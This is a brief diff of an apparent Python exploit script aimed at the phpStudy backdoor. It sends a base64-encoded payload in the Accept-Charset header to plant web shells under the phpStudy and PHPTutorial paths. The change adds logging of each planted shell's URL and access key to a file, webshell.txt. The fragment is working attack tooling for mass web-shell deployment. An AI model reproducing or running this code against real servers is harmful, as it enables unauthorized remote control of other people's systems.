@@ -41,8 +41,10 @@ def exp():
         exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
         head['Accept-Charset'] = exp_encode
         requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
-    write_shell(version_path='phpStudy')
-    write_shell(version_path='PHPTutorial')
+    write_shell('phpStudy')
+    write_shell('PHPTutorial')
+    with open("webshell.txt", "a") as f:
+        f.write(f"{url}/{shell_name}.php, {key}\n")
     return f"\033[33m[*] Shell_name={shell_name}.php, Key={key}\033[0m"
 
 
